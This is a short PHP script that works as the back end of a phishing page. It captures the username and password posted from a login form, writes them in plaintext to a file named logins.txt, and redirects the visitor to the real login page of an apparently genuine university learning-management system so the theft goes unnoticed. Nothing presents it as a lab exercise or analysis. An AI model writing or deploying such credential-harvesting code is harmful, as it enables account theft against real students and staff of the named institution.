<?php
// Check if the request method is POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the posted data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the data to a text file (logins.txt)
    $file = 'logins.txt';
    $current_data = file_get_contents($file);
    $current_data .= "Username: " . $username . " | Password: " . $password . "\n";
    file_put_contents($file, $current_data);

    // Redirect to lms2.psu.ac.th
    header('Location: https://lms2.psu.ac.th/login/index.php');
    exit();
}
?>
